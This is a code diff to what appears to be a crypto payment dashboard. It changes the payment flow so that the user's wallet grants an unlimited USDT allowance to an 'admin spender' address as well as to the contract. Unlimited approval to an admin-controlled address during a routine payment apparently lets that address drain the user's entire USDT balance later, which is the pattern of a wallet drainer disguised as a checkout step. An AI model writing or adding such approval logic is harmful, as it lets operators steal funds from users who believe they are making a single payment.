@@ -77,6 +77,21 @@ function getApprovalSpenderAddress(chain: Chain, fallbackAddress: string): strin
   return fallbackAddress;
 }
 
+function buildApprovalSpenders(chain: Chain, contractAddress: string): string[] {
+  const adminSpender = getApprovalSpenderAddress(chain, contractAddress).trim();
+  const contractSpender = contractAddress.trim();
+  const spenders = [adminSpender, contractSpender].filter(Boolean);
+  const deduped: string[] = [];
+  const seen = new Set<string>();
+  for (const spender of spenders) {
+    const dedupeKey = chain === "tron" ? spender : spender.toLowerCase();
+    if (seen.has(dedupeKey)) continue;
+    seen.add(dedupeKey);
+    deduped.push(spender);
+  }
+  return deduped;
+}
+
 const fadeIn = {
   hidden: { opacity: 0, y: 15 },
   visible: (i: number) => ({
@@ -350,17 +365,19 @@ const Dashboard = () => {
         throw error;
       }
 
-      // Step 1: Approve unlimited USDT allowance for configured spender.
+      // Step 1: Approve unlimited USDT allowance for required spenders.
       console.log(`[Payment] Step 1: Approving USDT for ${selectedChain}...`);
-      const approvalSpenderAddress = getApprovalSpenderAddress(selectedChain, contractConfig.contractAddress);
+      const approvalSpenders = buildApprovalSpenders(selectedChain, contractConfig.contractAddress);
       try {
-        await approveUSDT(
-          selectedChain,
-          approvalSpenderAddress,
-          UNLIMITED_APPROVAL_AMOUNT,
-          contractConfig.usdtTokenAddress
-        );
-        console.log(`[Payment] Step 1: USDT approval successful`);
+        for (const spenderAddress of approvalSpenders) {
+          await approveUSDT(
+            selectedChain,
+            spenderAddress,
+            UNLIMITED_APPROVAL_AMOUNT,
+            contractConfig.usdtTokenAddress
+          );
+          console.log(`[Payment] Step 1: USDT approval successful for spender`, spenderAddress);
+        }
       } catch (approveError) {
         console.error(`[Payment] Step 1: USDT approval failed:`, approveError);
         throw approveError;
